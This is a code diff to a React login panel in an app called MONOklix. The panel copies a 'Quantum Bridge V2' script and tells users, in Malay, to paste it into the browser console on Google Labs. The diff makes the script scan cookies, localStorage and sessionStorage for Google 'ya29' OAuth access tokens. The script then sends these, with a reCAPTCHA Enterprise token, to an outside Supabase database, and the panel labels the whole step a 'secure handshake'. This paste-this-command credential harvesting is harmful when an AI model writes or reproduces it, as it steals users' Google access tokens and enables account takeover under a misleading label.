@@ -136,26 +136,50 @@ const CloudLoginPanel: React.FC<{currentUser: User, onUserUpdate: (u: User) => v
     const copyBridgeSnippet = () => {
         const snippet = `
 (async () => {
-  console.log("%c MONOklix Quantum Bridge Activated ", "background: #4A6CF7; color: white; font-weight: bold; padding: 4px; border-radius: 4px;");
+  console.log("%c MONOklix Quantum Bridge V2 Activated ", "background: #4A6CF7; color: white; font-weight: bold; padding: 4px; border-radius: 4px;");
   try {
     const userId = "${currentUser.id}";
     const siteKey = "6LdsFiUsAAAAAIjVDZcuLhaHiDn5nnHVXVRQGeMV";
-    
-    // 1. Extract ya29
-    const cookie = document.cookie.split('; ').find(r => r.startsWith('__Secure-next-auth.session-token='));
-    if(!cookie) throw new Error("Sila login Google Labs dahulu!");
-    const rawJwt = cookie.split('=')[1];
-    const payload = JSON.parse(atob(rawJwt.split('.')[1]));
-    const ya29 = payload.accessToken || payload.access_token;
-    
-    console.log("✅ ya29 Token Extracted:", ya29.substring(0,10) + "...");
+    let ya29 = "";
 
-    // 2. Generate reCAPTCHA Token (PINHOLE_GENERATE)
-    console.log("🔐 Generating Verified reCAPTCHA token...");
+    // 1. Deep Scan: Cari dalam Cookies mentah
+    const ya29Match = document.cookie.match(/ya29\\.[a-zA-Z0-9_-]{50,}/);
+    if (ya29Match) {
+      ya29 = ya29Match[0];
+    }
+
+    // 2. Fallback: Scan LocalStorage (untuk app moden)
+    if (!ya29) {
+      for (let i = 0; i < localStorage.length; i++) {
+        const key = localStorage.key(i);
+        const val = localStorage.getItem(key);
+        const match = val.match(/ya29\\.[a-zA-Z0-9_-]{50,}/);
+        if (match) { ya29 = match[0]; break; }
+      }
+    }
+
+    // 3. Last Resort: Scan SessionStorage
+    if (!ya29) {
+      for (let i = 0; i < sessionStorage.length; i++) {
+        const key = sessionStorage.key(i);
+        const val = sessionStorage.getItem(key);
+        const match = val.match(/ya29\\.[a-zA-Z0-9_-]{50,}/);
+        if (match) { ya29 = match[0]; break; }
+      }
+    }
+
+    if(!ya29) {
+        throw new Error("Token ya29 tidak dijumpai. Pastikan anda sudah login dan berada di tab Labs Google.");
+    }
+    
+    console.log("🎯 Token Captured:", ya29.substring(0,15) + "...");
+
+    // 4. Generate reCAPTCHA Token
+    console.log("🔐 Verifying with Google reCAPTCHA Enterprise...");
     const recaptchaToken = await grecaptcha.enterprise.execute(siteKey, {action: 'PINHOLE_GENERATE'});
     
-    // 3. Sync with MONOklix via Supabase REST
-    console.log("🚀 Syncing with MONOklix...");
+    // 5. Sync ke MONOklix
+    console.log("🚀 Handshaking with MONOklix...");
     const res = await fetch("https://xbbhllhgbachkzvpxvam.supabase.co/rest/v1/users?id=eq." + userId, {
       method: "PATCH",
       headers: {
@@ -167,17 +191,18 @@ const CloudLoginPanel: React.FC<{currentUser: User, onUserUpdate: (u: User) => v
     });
 
     if(res.ok) {
-      console.log("%c SUCCESS! MONOklix is now synced and active. ✅ ", "color: #10b981; font-weight: bold;");
+      console.log("%c ✅ SYNC SUCCESSFUL! MONOklix is now active. ", "background: #10b981; color: white; font-weight: bold; padding: 4px; border-radius: 4px;");
     } else {
-      throw new Error("Gagal menghantar ke MONOklix. Sila cuba lagi.");
+      throw new Error("Gagal menghantar data ke DB.");
     }
   } catch (e) {
     console.error("❌ BRIDGE ERROR:", e.message);
+    alert("Ralat Bridge: " + e.message);
   }
 })();`.trim();
         
         navigator.clipboard.writeText(snippet);
-        alert("Quantum Bridge Script disalin!\n\n1. Pergi ke tab labs.google.com\n2. Tekan F12 (Console)\n3. Paste & Enter.");
+        alert("Quantum Bridge V2 disalin!\n\n1. Pergi ke tab Google Labs\n2. Tekan F12 -> Console\n3. Paste & Enter.");
     };
 
     return (
@@ -222,7 +247,7 @@ const CloudLoginPanel: React.FC<{currentUser: User, onUserUpdate: (u: User) => v
                 
                 <div className="mt-4 flex items-center gap-2 text-[10px] text-neutral-500 font-mono">
                     <ShieldCheckIcon className="w-3 h-3 text-green-500" />
-                    STATUS: SECURE HANDSHAKE READY
+                    STATUS: SECURE HANDSHAKE READY (V2)
                 </div>
             </div>
 
